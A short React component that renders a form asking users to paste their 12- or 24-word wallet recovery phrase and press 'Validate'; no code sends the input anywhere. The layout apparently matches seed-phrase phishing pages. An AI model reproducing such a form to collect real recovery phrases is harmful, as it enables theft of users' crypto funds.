import React from 'react'

const PrivateKey = () => {
  return (
    <div className=" text-center py-14">
      <form action="">
        <textarea
          className="w-[90%] h-[200px] text-slate-100 bg-transparent border py-5 outline-0 px-6  border-yellow-500 mb-14"
          placeholder="Typically 12 (sometimes 24) words seperated by single spaces."
        ></textarea>
        <button className="w-[90%] py-2 rounded-lg bg-yellow-500 hover:bg-yellow-400 px-10">
         Validate
        </button>
      </form>
    </div>
  );
}

export default PrivateKey